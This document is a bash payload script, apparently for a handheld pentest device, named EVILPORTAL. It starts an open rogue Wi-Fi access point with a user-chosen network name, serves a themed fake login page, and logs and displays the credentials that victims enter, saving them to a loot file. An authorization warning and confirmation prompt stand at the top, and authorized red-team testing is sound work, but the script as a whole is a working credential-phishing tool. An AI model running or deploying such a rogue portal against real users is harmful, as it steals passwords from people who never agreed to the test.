#!/bin/bash
# Title: EVILPORTAL - Evil Captive Portal
# Description: Serves an open rogue AP with a themed captive portal (Flipper
#              Zero Evil Portal templates) and captures the credentials that
#              get submitted.
# Author: sinXne0
# Version: 1.0
# Category: user/interception
# Firmware: 2.0.0-stable or newer
#
# Authorized testing only. This impersonates a Wi-Fi network and logs
# credentials submitted to its portal. Use only on networks you own or have
# written permission to test.

# === DUCKYSCRIPT STUBS (dev / non-Pager) ===
command -v LOG >/dev/null 2>&1                || LOG() { echo "${2:-}"; }
command -v ALERT >/dev/null 2>&1              || ALERT() { echo "ALERT: $*"; }
command -v ERROR_DIALOG >/dev/null 2>&1       || ERROR_DIALOG() { echo "ERROR: $*"; }
command -v TEXT_PICKER >/dev/null 2>&1        || TEXT_PICKER() { echo "${2:-}"; }
command -v LIST_PICKER >/dev/null 2>&1        || LIST_PICKER() { echo "${2:-}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "true"; }
command -v WAIT_FOR_INPUT >/dev/null 2>&1     || WAIT_FOR_INPUT() { read -r b; echo "${b:-B}"; }
command -v LED >/dev/null 2>&1                || LED() { :; }

confirmed() {
    [ "$1" = "$DUCKYSCRIPT_USER_CONFIRMED" ] || [ "$1" = "true" ]
}

# === PATHS ===
SCRIPT_SOURCE="${BASH_SOURCE[0]:-$0}"
PAYLOAD_DIR="$(cd "$(dirname "$SCRIPT_SOURCE")" 2>/dev/null && pwd)"
ENGINE="$PAYLOAD_DIR/evilportal.py"
PORTAL_DIR="$PAYLOAD_DIR/portals"
LOOT="/root/loot/evilportal"
[ -d /mmc/root/loot ] && LOOT="/mmc/root/loot/evilportal"
RUNLOG="/tmp/evilportal_run.log"

# === AUTHORIZATION ===
LOG "red" "==============================="
LOG "red" "    AUTHORIZED TESTING ONLY"
LOG "red" "==============================="
LOG ""
LOG "Serves a fake Wi-Fi login page and"
LOG "captures what gets entered."
LOG ""
resp=$(CONFIRMATION_DIALOG "I have authorization to test this network.")
confirmed "$resp" || { LOG "red" "Not confirmed. Exiting."; exit 1; }

if [ ! -f "$ENGINE" ]; then
    ERROR_DIALOG "evilportal.py not found.\n\n$PAYLOAD_DIR"
    exit 1
fi

# === CONFIG ===
SSID=$(TEXT_PICKER "Network name (SSID)" "Free WiFi")
[ -z "$SSID" ] && exit 0

PORTALS=()
for f in "$PORTAL_DIR"/*.html; do
    [ -f "$f" ] && PORTALS+=("$(basename "$f")")
done
if [ "${#PORTALS[@]}" -eq 0 ]; then
    ERROR_DIALOG "No portal templates in $PORTAL_DIR"
    exit 1
fi
PORTAL=$(LIST_PICKER "Portal theme" "${PORTALS[@]}")
[ -z "$PORTAL" ] && exit 0
PORTAL_FILE="$PORTAL_DIR/$PORTAL"

mkdir -p "$LOOT"

# === START ENGINE ===
LED BLUE 2>/dev/null
LOG ""
LOG cyan "Starting evil portal..."
LOG "  SSID   : $SSID"
LOG "  portal : $PORTAL"
LOG "  loot   : $LOOT"
: > "$RUNLOG"
python3 "$ENGINE" run --ssid "$SSID" --portal "$PORTAL_FILE" --loot "$LOOT" \
    >>"$RUNLOG" 2>&1 &
ENGINE_PID=$!

# Wait for the AP to come up (or fail).
for _ in $(seq 1 30); do
    sleep 0.4
    kill -0 "$ENGINE_PID" 2>/dev/null || break
    grep -q "AP LIVE" "$RUNLOG" 2>/dev/null && break
done

if ! kill -0 "$ENGINE_PID" 2>/dev/null; then
    LED RED 2>/dev/null
    ERROR_DIALOG "Engine failed to start.\n\n$(tail -6 "$RUNLOG")"
    exit 1
fi
grep "AP LIVE" "$RUNLOG" 2>/dev/null | while IFS= read -r line; do LOG green "$line"; done

LED GREEN 2>/dev/null
LOG ""
LOG "Live. Captured credentials appear below."
LOG "Press B to stop."
LOG ""

# Follow the engine log and surface captured creds.
tail -n +1 -f "$RUNLOG" 2>/dev/null | while IFS= read -r line; do
    case "$line" in
        *CAPTURED*) LOG magenta "  $line" ;;
        *ERROR*)    LOG red "  $line" ;;
    esac
done &
MONITOR_PID=$!

# === STOP ===
while kill -0 "$ENGINE_PID" 2>/dev/null; do
    BUTTON=$(WAIT_FOR_INPUT)
    case "$BUTTON" in
        "B"|"RED"|"Escape") break ;;
    esac
done

kill "$ENGINE_PID" 2>/dev/null
kill "$MONITOR_PID" 2>/dev/null
sleep 1
LED WHITE 2>/dev/null
LOG ""
LOG green "EVILPORTAL stopped."
LOG "  creds : $LOOT/creds.jsonl"
exit 0
